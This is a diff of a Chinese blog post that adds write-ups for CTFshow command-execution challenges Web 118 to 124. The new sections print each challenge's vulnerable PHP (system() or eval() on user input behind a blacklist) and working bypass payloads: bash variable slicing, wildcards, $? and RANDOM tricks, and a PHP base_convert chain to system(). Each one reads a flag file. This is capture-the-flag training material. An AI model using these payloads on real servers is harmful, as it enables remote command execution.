@@ -19,16 +19,17 @@
   <meta name="author" content="butt3rf1y">
   <meta name="keywords" content="">
   
-    <meta name="description" content="未完待续">
+    <meta name="description" content="未完待续 已完结">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTFshow-命令执行">
 <meta property="og:url" content="http://example.com/2025/03/15/CTFshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="(｡･ω･｡)Welcome~">
-<meta property="og:description" content="未完待续">
+<meta property="og:description" content="未完待续 已完结">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/ab36673e8f412f92.png">
+<meta property="og:image" content="https://img.dkdun.cn/v1/2025/12/c0b74c7d52bfc6f9.png">
 <meta property="article:published_time" content="2025-03-15T14:47:36.000Z">
-<meta property="article:modified_time" content="2025-03-15T14:51:56.066Z">
+<meta property="article:modified_time" content="2025-03-16T11:09:34.966Z">
 <meta property="article:author" content="butt3rf1y">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
@@ -250,7 +251,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          9.1k 字
+          11k 字
         
       </span>
     
@@ -261,7 +262,7 @@
         
         
         
-          76 分钟
+          92 分钟
         
       </span>
     
@@ -313,7 +314,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年3月15日 晚上
+                    本文最后更新于 2025年3月16日 晚上
                   
                 
               </p>
@@ -321,7 +322,7 @@
             
               <div class="markdown-body">
                 
-                <p>未完待续</p>
+                <p><del>未完待续</del> 已完结</p>
 <span id="more"></span>
 
 <h1 id="Web-29"><a href="#Web-29" class="headerlink" title="Web 29"></a>Web 29</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-04 00:12:34<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-04 00:26:48<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>error_reporting(0);<br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c = $_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;<br>        eval($c);<br>    &#125;<br>    <br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure>
@@ -648,6 +649,85 @@
 
 <p>然后访问</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">url/flagxx.txt<br></code></pre></td></tr></table></figure>
+
+<h1 id="Web-118"><a href="#Web-118" class="headerlink" title="Web 118"></a>Web 118</h1><p>只有一个输入框，f12 发现有一句 <code>&lt;!-- system($code);--&gt;</code> 也就是说输入的内容会被 <code>system()</code> 函数执行，而且只剩下 <code>$</code>、<code>&#123;</code>、<code>&#125;</code>、<code>?</code> 、<code>.</code> 、<code>~</code> 等等字符和大写字母没有被 ban</p>
+<p>可以用这些字符构建命令：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9934595.html#title_path">常见 Bash 内置变量介绍</a></p>
+<p>比如 <code>$PATH</code>、<code>$PWD</code></p>
+<p><img src="https://img.dkdun.cn/v1/2025/12/c0b74c7d52bfc6f9.png"></p>
+<p>上面的 <code>$&#123;PATH:5:1&#125;$&#123;PATH:11:1&#125;</code> 输出了 <code>ls</code> ，这是因为 Linux 中的切片，在 Linux 中，<code>$&#123;var:offset:length&#125;</code> 为字符串切片形式，如上所示。当 <code>length</code> 为负数时，从尾部开始输出。</p>
+<p><code>$&#123;PATH:5:1&#125;$&#123;PATH:11:1&#125;</code> 就是利用的 <code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code> 中第 6 位( offset +1)字符  <code>l</code>  和第 12 位字符  <code>s</code>，组合输出了 <code>ls</code>，因此我们可以构造想要的命令输出。</p>
+<p>但是数字被 ban 了，无法知道某个字符位置，这时候就能想到  Shell 语言中的 <code>$(())</code>，它是等于 0 的，取反后为 -1，但是 <code>()</code> 也被 ban了，没事，可以用 <code>$&#123;&#125;</code> </p>
+<p>对一个空变量取反可以拿到一样的效果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# <span class="hljs-built_in">echo</span> $((N))<br>0<br><br>┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# <span class="hljs-built_in">echo</span> $((~N))<br>-1<br></code></pre></td></tr></table></figure>
+
+<p>所以，我们可以构造一个<code>nl</code> 列出 flag 内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# <span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;PATH:~N&#125;</span><br>n<br></code></pre></td></tr></table></figure>
+
+<p>然后在 <code>/var/www/html</code> 目录下可以拿到 <code>l</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿butt3rf1y)-[/var/www/html]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;PWD:~N&#125;</span><br>l<br></code></pre></td></tr></table></figure>
+
+<p>而我们的 flag 直接用通配符</p>
+<p>综上所述，payload 为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PATH:~N&#125;<span class="hljs-variable">$&#123;PWD:~N&#125;</span> ????????</span><br></code></pre></td></tr></table></figure>
+
+<p>查看源代码找到 flag</p>
+<h1 id="Web-119"><a href="#Web-119" class="headerlink" title="Web 119"></a>Web 119</h1><h2 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h2><p>用上一个 payload 已经不行了，<code>PATH</code> 被禁了，那么用 <code>PWD</code> 去构造，用 <code>whereis</code> 命令可以找到 <code>nl</code> 指令路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# whereis <span class="hljs-built_in">nl</span><br><span class="hljs-built_in">nl</span>: /usr/bin/nl<br></code></pre></td></tr></table></figure>
+
+<p>因为 <code>PATH</code> 不能用，那就用通配符 <code>?</code>，<code>nl</code> 就可以表示为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?$&#123;PWD:~N&#125;<br></code></pre></td></tr></table></figure>
+
+<p>需要带上路径 <code>/usr/bin/</code>，但是 <code>/</code> 和小写字母也被 ban 了，还是可以用 <code>?</code> 代替</p>
+<p>而输出 <code>$PWD</code> 就能知道第一位就是 <code>/</code>，所以我们可以截取出来，当我们用 <code>set</code> 查看环境变量的时候会发现</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SHLVL=1<br></code></pre></td></tr></table></figure>
+
+<p>因此我们可以输出 <code>SHLVL</code> 来表示 1</p>
+<p>在 Linux 中，<code>$&#123;&#125;</code> 中变量前加 <code>#</code> 可以获取字符串长度，那么就能表示为如下形式</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;#SHLVL&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>因此构造出形如</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;???<span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>???<span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>?<span class="hljs-variable">$&#123;PWD:~N&#125;</span> ????????</span><br></code></pre></td></tr></table></figure>
+
+<p>这个 payload 为 :<code>/usr/bin/nl flag.xxx</code> 形式，因为 数字被 ban 了，所以 <code>$&#123;var:offset:length&#125;</code> 就可以简写成 <code>$&#123;var::length&#125;</code> 表示从 0 开始</p>
+<p><code>SHLVL</code> 是记录多个 Bash 进程实例嵌套深度的累加器，比如说第一次打开 shell 时 <code>$SHLVL=1</code> ,然后在此 shell 中再打开一个 shell 时 <code>$SHLVL=2</code>，其实就是套娃的数量</p>
+<h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p>相同的步骤</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/cat<br></code></pre></td></tr></table></figure>
+
+<p>构造出</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PWD:<span class="hljs-variable">$&#123;#&#125;</span>:<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;???<span class="hljs-variable">$&#123;PWD:<span class="hljs-variable">$&#123;#&#125;</span>:<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>??<span class="hljs-variable">$&#123;HOME:<span class="hljs-variable">$&#123;#HOSTNAME&#125;</span>:<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span> ????????</span><br></code></pre></td></tr></table></figure>
+
+<h1 id="Web-120"><a href="#Web-120" class="headerlink" title="Web 120"></a>Web 120</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_POST[&#x27;code&#x27;]))&#123;<br>    $code=$_POST[&#x27;code&#x27;];<br>    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    <br>        if(strlen($code)&gt;65)&#123;<br>            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>        else&#123;<br>        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>    &#125;<br>    else&#123;<br>     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>终于有源码了TVT</p>
+<p>因为有了长度限制为 65，之前的超出限制了，把 <code>SHLVL</code> 换成变量 <code>#</code></p>
+<p>于是 <code>$&#123;PWD::$&#123;SHLVL&#125;&#125;</code> -&gt; <code>$&#123;PWD::$&#123;##&#125;&#125;</code>构造 payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;?$&#123;PWD:~N&#125; ????????<br></code></pre></td></tr></table></figure>
+
+<h1 id="Web-121"><a href="#Web-121" class="headerlink" title="Web 121"></a>Web 121</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_POST[&#x27;code&#x27;]))&#123;<br>    $code=$_POST[&#x27;code&#x27;];<br>    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    <br>        if(strlen($code)&gt;65)&#123;<br>            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>        else&#123;<br>        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>    &#125;<br>    else&#123;<br>     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>ban 了很多，但是还是能用 <code>PWD</code> ，用  <code>/???/r??</code> 构造出路径  <code>bin/rev</code>  执行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????????<br></code></pre></td></tr></table></figure>
+
+<p>然后</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;galf&quot;</span> | rev<br></code></pre></td></tr></table></figure>
+
+<h1 id="Web-122"><a href="#Web-122" class="headerlink" title="Web 122"></a>Web 122</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_POST[&#x27;code&#x27;]))&#123;<br>    $code=$_POST[&#x27;code&#x27;];<br>    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    <br>        if(strlen($code)&gt;65)&#123;<br>            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>        else&#123;<br>        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>    &#125;<br>    else&#123;<br>     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p><code>PWD</code> 和 <code>#</code> 都不能用了，hint 给的</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">通过<span class="hljs-variable">$?</span>来实现的，<span class="hljs-variable">$?</span>是表示上一条命令执行结束后的传回值。通常<span class="hljs-number">0</span>代表执行成功，非<span class="hljs-number">0</span>代表执行有误<br><br><span class="hljs-symbol">payload:</span>code=&lt;A;<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">RANDOM</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125; <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><span class="hljs-comment">#可能存在成功的机会，不断刷新</span><br></code></pre></td></tr></table></figure>
+
+<p>随机，一直刷新就能出来</p>
+<p><code>&lt;A</code> 是将 A 文件夹内的命令重定向到终端进行执行，由于没有文件 A 肯定就会报错，那么 <code>$?</code> 就为 1，用 <code>$&#123;HOME::$?&#125;</code> 得到 <code>/</code>，再用 <code>RANDOM</code> 随机数随机到 4 就能执行 <code>/bin/base64</code></p>
+<h1 id="Web-124"><a href="#Web-124" class="headerlink" title="Web 124"></a>Web 124</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: 收集自网络<br># @Date:   2020-09-16 11:25:09<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-10-06 14:04:45<br><br>*/<br><br>error_reporting(0);<br>//听说你很喜欢数学，不知道你是否爱它胜过爱flag<br>if(!isset($_GET[&#x27;c&#x27;]))&#123;<br>    show_source(__FILE__);<br>&#125;else&#123;<br>    //例子 c=20-1<br>    $content = $_GET[&#x27;c&#x27;];<br>    if (strlen($content) &gt;= 80) &#123;<br>        die(&quot;太长了不会算&quot;);<br>    &#125;<br>    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];<br>    foreach ($blacklist as $blackitem) &#123;<br>        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;<br>            die(&quot;请不要输入奇奇怪怪的字符&quot;);<br>        &#125;<br>    &#125;<br>    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp<br>    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];<br>    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  <br>    foreach ($used_funcs[0] as $func) &#123;<br>        if (!in_array($func, $whitelist)) &#123;<br>            die(&quot;请不要输入奇奇怪怪的函数&quot;);<br>        &#125;<br>    &#125;<br>    //帮你算出答案<br>    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>只能用白名单里的这些函数，都是一些 Math 函数，里面有很多进制转换的函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">base_convert-在任意进制之间转换数字<br><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$num</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$from_base</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$to_base</span>): <span class="hljs-keyword">string</span><br><br>bindec-二进制转十进制<br><span class="hljs-title function_ invoke__">bindec</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$binary_string</span>): <span class="hljs-keyword">int</span>|<span class="hljs-keyword">float</span><br>    <br>decbin-十进制转换为二进制<br><span class="hljs-title function_ invoke__">decbin</span>(<span class="hljs-keyword">int</span> <span class="hljs-variable">$num</span>): <span class="hljs-keyword">string</span><br><br>dechex-十进制转换为十六进制<br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-keyword">int</span> <span class="hljs-variable">$num</span>): <span class="hljs-keyword">string</span><br>    <br>decoct-十进制转换为八进制<br><span class="hljs-title function_ invoke__">decoct</span>(<span class="hljs-keyword">int</span> <span class="hljs-variable">$num</span>): <span class="hljs-keyword">string</span><br><br>hexdec-十六进制转换为十进制<br><span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$hex_string</span>): <span class="hljs-keyword">int</span>|<span class="hljs-keyword">float</span><br></code></pre></td></tr></table></figure>
+
+<p>我们只能构造函数或构造字母，<code>base_convert()</code> 函数能实现任意进制转换，在 36 进制中包含了所有的数字和字母，所以只需要将构造出 <code>hex2bin</code> 函数，然后再用 <code>hexdex</code> 函数转换成十进制，当我们构造的时候需要反过来执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&#x27;hex2bin&#x27;</span>, <span class="hljs-number">36</span>, <span class="hljs-number">10</span>);<br>&gt;&gt;<span class="hljs-number">37907361743</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;_GET&quot;</span>));<br>&gt;&gt;<span class="hljs-number">1598506324</span><br></code></pre></td></tr></table></figure>
+
+<p>拿函数作为参数构造出<code>c=$_GET[1]($_GET[2])&amp;1=system&amp;2=cat flag</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">1598506324</span>));<span class="hljs-variable">$$pi</span>&#123;<span class="hljs-number">1</span>&#125;(<span class="hljs-variable">$$pi</span>&#123;<span class="hljs-number">2</span>&#125;);&amp;<span class="hljs-number">1</span>=system&amp;<span class="hljs-number">2</span>=tac f*<br></code></pre></td></tr></table></figure>
 
                 
               </div>
